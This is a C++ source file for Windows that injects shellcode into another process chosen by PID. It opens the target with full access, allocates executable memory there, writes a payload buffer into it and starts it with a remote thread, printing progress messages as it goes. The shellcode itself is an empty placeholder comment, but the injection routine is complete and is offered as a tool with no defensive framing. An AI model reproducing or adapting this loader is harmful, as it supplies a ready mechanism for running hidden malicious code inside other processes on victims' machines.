#include <windows.h>
#include <iostream>
#include <thread>
#include <chrono>

unsigned char buf[] = /*Shellcode*/;
unsigned int payload_len = sizeof(buf);

int steal_process(int process_ID) {
    
    DWORD PID, new_pid = 0;
    HANDLE hProcess, hThread;
    void* rBuffer;

    PID = process_ID;

    std::cout << "\n[+] Trying to handle the process => " << PID << "...\n";
    std::this_thread::sleep_for(std::chrono::seconds(1));

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);

    if (hProcess == NULL) {
        std::cerr << "[X] The process [" << PID << "] could not be opened!\n";
        std::cerr << "ERROR: " << GetLastError() << std::endl;
        return 1;
    }

    rBuffer = VirtualAllocEx(hProcess, NULL, payload_len, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    std::cout << "(!) The payload was allocated in the process with " << sizeof(buf) << " bytes and 'PAGE_EXECUTE_READWRITE' privileges!\n";
    std::this_thread::sleep_for(std::chrono::seconds(1));

    WriteProcessMemory(hProcess, rBuffer, buf, payload_len, NULL);
    std::cout << "(!) The payload with (" << sizeof(buf) << ") bytes has been written to the process memory\n\n";
    std::cout << "[+] Creating new thread!...\n";
    
    std::this_thread::sleep_for(std::chrono::seconds(2));

    hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &new_pid);

    if (hThread == NULL) {
        std::cerr << "[X] Failed to create remote thread\n";
        std::cerr << "ERROR: " << GetLastError() << std::endl;

        CloseHandle(hProcess);
        return 1;
    }

    std::cout << "(!) Remote thread created! The payload is running... [PID: " << new_pid << "]\n";
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}

int main(int argc, char* argv[]) {
    
    if (argc < 2) {
        std::cerr << "(!) ./app <Process PID>" << std::endl;
        return 1;
    } 
    else {
        steal_process(atoi(argv[1]));
    }
    return 0;
}
